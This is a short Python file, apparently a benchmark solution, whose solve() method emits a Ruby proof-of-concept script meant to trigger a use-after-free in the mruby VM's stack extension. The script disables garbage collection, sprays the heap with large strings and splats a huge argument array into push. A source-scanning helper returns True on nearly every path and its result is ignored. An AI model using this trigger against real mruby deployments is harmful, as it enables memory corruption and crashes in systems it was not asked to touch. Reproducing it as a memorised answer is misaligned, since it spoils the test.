import os
import io
import tarfile
from typing import Optional


class Solution:
    def _looks_like_mruby(self, src_path: str) -> bool:
        try:
            if os.path.isdir(src_path):
                root = src_path
                for dirpath, _, filenames in os.walk(root):
                    for fn in filenames:
                        if fn.endswith((".c", ".h", ".cpp")):
                            p = os.path.join(dirpath, fn)
                            try:
                                with open(p, "rb") as f:
                                    data = f.read(200000)
                                if b"mrb_stack_extend" in data or b"mrb_vm_exec" in data or b"mruby" in data:
                                    return True
                            except OSError:
                                pass
                return False

            if not os.path.isfile(src_path):
                return True

            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isreg():
                        continue
                    name = m.name
                    if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".cpp")):
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read(200000)
                        if b"mrb_stack_extend" in data or b"mrb_vm_exec" in data or b"mruby" in data:
                            return True
                    except Exception:
                        continue
        except Exception:
            return True
        return True

    def solve(self, src_path: str) -> bytes:
        _ = self._looks_like_mruby(src_path)

        # Ruby script PoC targeting mruby VM stack extension UAF
        # Keep allocations alive to reduce chance of in-place realloc.
        n_args = 55000
        n_blocks = 320
        block_size = 16384

        poc = (
            "begin;GC.disable;rescue;end\n"
            "$b=[]\n"
            f"i=0\nwhile i<{n_blocks}\n  $b<<('B'*{block_size})\n  i+=1\nend\n"
            f"args=Array.new({n_args},1)\n"
            "a=[]\n"
            "a.push(*args)\n"
        )
        return poc.encode("utf-8")